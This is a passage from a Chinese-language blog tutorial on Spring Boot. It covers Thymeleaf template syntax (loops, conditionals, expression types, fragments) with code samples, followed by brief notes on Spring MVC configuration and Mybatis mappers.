punctuation attr-equals">=</span><span class="token punctuation">"</span>1px<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200px<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>thead</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>编号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>姓名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>年龄<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>操作<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>thead</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tbody</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span> <span class="token attr-name"><span class="token namespace">th:</span>each</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>p:$&#123;pers&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>编号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;p.name&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;p.age&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>删除/修改<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tbody</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tbody</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span> <span class="token attr-name"><span class="token namespace">th:</span>each</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>p,pState:$&#123;pers&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;pState.index+1&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;p.name&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;p.age&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>删除/修改<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tbody</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/28/SpringBoot/image-20240709224536399.png" alt="image-20240709224536399"></p><p>对于<code>th:each=&quot;p,:$&#123;pers&#125;</code>，p是循环的每一项，pState是下标属性，包括：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">index：列表状态的序号，从0开始；count：列表状态的序号，从1开始；size：列表状态，列表数据条数；current：列表状态，当前数据对象even：列表状态，是否为奇数，boolean类型odd：列表状态，是否为偶数，boolean类型first：列表状态，是否为第一条，boolean类型last：列表状态，是否为最后一条，boolean类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>th:if</code>：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:if 条件判断，类似的有th:switch，th:case，优先级仅次于th:each,--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;map.Boss.name&#125;<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;map.Boss.age gt 20&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中的关系运算：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">gt：great than（大于）ge：great equal（大于等于）eq：equal（等于）lt：less than（小于）le：less equal（小于等于）ne：not equal（不等于）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为boss的age属性大于20，所以会显示</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709225027975.png" alt="image-20240709225027975"></p></li></ul></li></ol><hr><h5 id="标准表达式语法"><a href="#标准表达式语法" class="headerlink" title="标准表达式语法"></a>标准表达式语法</h5><p><code>$&#123;&#125;</code>：变量表达式，有丰富的内置方法</p><ul><li><p>可以获取对象的属性和方法</p></li><li><p>可以使用内置对象：</p><ul><li>ctx：上下文对象</li><li>vars：上下文变量</li><li>locale：上下文的语言环境</li><li>request：仅在web上下文的 HttpServletRequest 对象</li><li>response：仅在web上下文的 HttpServletResponse 对象</li><li>session：仅在web上下文的 HttpSession对象</li><li>servletContext：仅在web上下文的 ServletContext 对象</li></ul><p>例子：</p><p>java 代码将用户名放在session中：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"userinfo"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>html里Thymeleaf通过内置对象直接获取：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">th:text="$&#123;session.userinfo&#125;"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>可以使用内置方法：</p><ul><li><p>dates：日期方法，常用的方法有：format，year，month，hour，createNow等</p></li><li><p>numbers：数值格式化方法，常用的方法有：formatDecimal等</p></li><li><p>strings：字符串格式化方法，常用的Java方法它都有。比如：equals，equalsIgnoreCase，length，trim，toUpperCase，toLowerCase，indexOf，substring，replace，startsWith，endsWith，contains，containsIgnoreCase等</p></li><li><p>bools：布尔方法，常用的方法有：isTrue，isFalse等</p></li><li><p>arrays：数组方法，常用的方法有：toArray，length，isEmpty，contains，containsAll等</p></li><li><p>lists，sets：集合方法，常用的方法有：toList，size，isEmpty，contains，containsAll，sort等</p></li><li><p>maps：对象方法，常用的方法有：size，isEmpty，containsKey，containsValue等</p></li></ul><p>例子： </p><p>在controller中绑定字符串</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"itdragonStr"</span><span class="token punctuation">,</span><span class="token string">"this is a DEMO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>html中使用内置方法：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>#strings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;not #strings.isEmpty(itdragonStr)&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Old Str : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;itdragonStr&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>toUpperCase : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.toUpperCase(itdragonStr)&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>toLowerCase : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.toLowerCase(itdragonStr)&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>equals : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.equals(itdragonStr, 'itdragonblog')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>equalsIgnoreCase : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.equalsIgnoreCase(itdragonStr, 'itdragonblog')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>indexOf : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.indexOf(itdragonStr, 'r')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>substring : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.substring(itdragonStr, 2, 8)&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>replace : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.replace(itdragonStr, 'it', 'IT')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>startsWith : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.startsWith(itdragonStr, 'it')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>contains : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.contains(itdragonStr, 'IT')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/28/SpringBoot/image-20240709231850749.png" alt="image-20240709231850749"></p></li></ul><br><p><code>@&#123;&#125;</code>：链接表达式</p><ul><li>无参：<code>@&#123;/xxx&#125;</code></li><li>有参：<code>@&#123;/xxx(k1=v1,k2=v2)&#125;</code> ，对应url结构：<code>xxx?k1=v1&amp;k2=v2</code></li><li>引入本地资源：<code>@&#123;/项目本地的资源路径&#125;</code></li><li>引入外部资源：<code>@&#123;/webjars/资源在jar包中的路径&#125;</code></li></ul><p>例子：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>引入外部资源<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>link th<span class="token operator">:</span>href<span class="token operator">=</span><span class="token string">"@&#123;/webjars/bootstrap/4.0.0/css/bootstrap.css&#125;"</span> rel<span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>引入本地资源<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>link th<span class="token operator">:</span>href<span class="token operator">=</span><span class="token string">"@&#123;/main/css/itdragon.css&#125;"</span> rel<span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>表单提交路径<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>form <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"form-login"</span> th<span class="token operator">:</span>action<span class="token operator">=</span><span class="token string">"@&#123;/user/login&#125;"</span> th<span class="token operator">:</span>method<span class="token operator">=</span><span class="token string">"post"</span> <span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>超链接跳转路径附带参数<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>a <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"btn btn-sm"</span> th<span class="token operator">:</span>href<span class="token operator">=</span><span class="token string">"@&#123;/login.html(l='zh_CN')&#125;"</span><span class="token operator">></span>中文<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span>a <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"btn btn-sm"</span> th<span class="token operator">:</span>href<span class="token operator">=</span><span class="token string">"@&#123;/login.html(l='en_US')&#125;"</span><span class="token operator">></span><span class="token class-name">English</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><code>#&#123;&#125;</code>：消息表达式，用来读取配置文件（通常是.properties文件）中的数据，<code>th:text=&quot;#&#123;msg&#125;&quot;</code></p><br><p><code>~&#123;&#125;</code>：代码块表达式，可以用于引用公共的目标片段。支持两种结构：<code>~&#123;templatename::fragmentname&#125;</code>和<code>~&#123;templatename::#id&#125;</code></p><ul><li>templatename：模版名，Thymeleaf会根据模版名解析完整路径：<code>/resources/templates/templatename.html</code>，要注意文件的路径</li><li>fragmentname：片段名，Thymeleaf通过<code>th:fragment</code>声明定义代码块，即：<code>th:fragment=&quot;fragmentname&quot;</code></li><li>id：HTML的id选择器，使用时要在前面加上#号，不支持class选择器</li></ul><p>使用时要配合th属性（th:insert，th:replace，th:include）一起使用：</p><ul><li><code>th:insert</code>：将代码块片段整个插入到使用了th:insert的HTML标签中</li><li><code>th:replace</code>：将代码块片段整个替换使用了th:replace的HTML标签中</li><li><code>th:include</code>：将代码块片段包含的内容插入到使用了th:include的HTML标签中</li></ul><p>例子：在一个<code>template/footer.html</code>中定义下面的片段，并在另一个template中引用</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--th:fragment定义代码块标识--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name"><span class="token namespace">th:</span>fragment</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>copy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2019 The Good Thymes Virtual Grocery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--三种不同的引入方式--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>insert</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer :: copy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>replace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer :: copy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>include</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer :: copy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而渲染后的结果是：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--th:insert是在div中插入代码块，即多了一层div--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">></span></span>    <span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2019 The Good Thymes Virtual Grocery    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:replace是将代码块代替当前div，其html结构和之前一致--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2019 The Good Thymes Virtual Grocery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:include是将代码块footer的内容插入到div中，即少了一层footer--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2019 The Good Thymes Virtual Grocery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><code>*&#123;&#125;</code>：选择变量表达式，<code>*&#123;&#125;</code>只对<strong>选定对象</strong>评估表达式而不是整个上下文。只要没有选定的对象，<code>$&#123;...&#125;</code>和<code>*&#123;...&#125;</code>的语法就完全一样</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>object</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;user&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*&#123;name&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>赛<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Age: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*&#123;age&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>18<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Detail: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*&#123;detail&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>好好学习<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h5 id="预处理表达式"><a href="#预处理表达式" class="headerlink" title="预处理表达式"></a>预处理表达式</h5><p>语法：<code>__$&#123;expression&#125;__</code></p><blockquote><p>预处理是在<strong>正常表达式之前完成</strong>的表达式的执行，允许修改最终将执行的表达式</p></blockquote><hr><h3 id="装配扩展SpringMVC"><a href="#装配扩展SpringMVC" class="headerlink" title="装配扩展SpringMVC"></a>装配扩展SpringMVC</h3><p>官方文档：<a href="https://docs.spring.io/spring-boot/docs/2.0.x/reference/html/boot-features-developing-web-applications.html">https://docs.spring.io/spring-boot/docs/2.0.x/reference/html/boot-features-developing-web-applications.html</a></p><blockquote><p>Spring MVC 允许创建特殊 <code>@Controller</code> 或 <code>@RestController</code> Bean 来处理传入的 HTTP 请求。控制器中的方法使用 <code>@RequestMapping</code> 注解映射到 HTTP</p></blockquote><p>而Spring Boot 为 Spring MVC 提供了自动配置</p><p>这个感觉暂时用不到，先挂起</p><h4 id="Configuration配置"><a href="#Configuration配置" class="headerlink" title="Configuration配置"></a>Configuration配置</h4><p>我们可以在一个类上加上<code>@configuration</code>注解，来代表一个配置类，配置类可以配置拦截器，等等<br>并且我们需要实现<code>WebMvcConfigurer</code>接口</p><hr><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><hr><h2 id="Druid"><a href="#Druid" class="headerlink" title="Druid"></a>Druid</h2><blockquote><p>Druid 是一个 JDBC 组件库，包含数据库连接池、SQL Parser 等组件</p></blockquote><hr><h2 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h2><p>先稍微copy一下增删查改吧，现在实在不想碰数据库</p><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><p>写UserMapper.xml的时候有个<code>select</code>标签，里面有几个属性：</p><ul><li>id: 对应的就是接口中的方法名称（等效于JDBC中的实现接口）</li><li>resultType: sql执行语句的返回值类型</li><li>parameterType：参数类型</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">User</span> <span class="token function">getuserbyid</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">mapper</span> <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Mapper 3.0//EN"</span>        <span class="token string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span 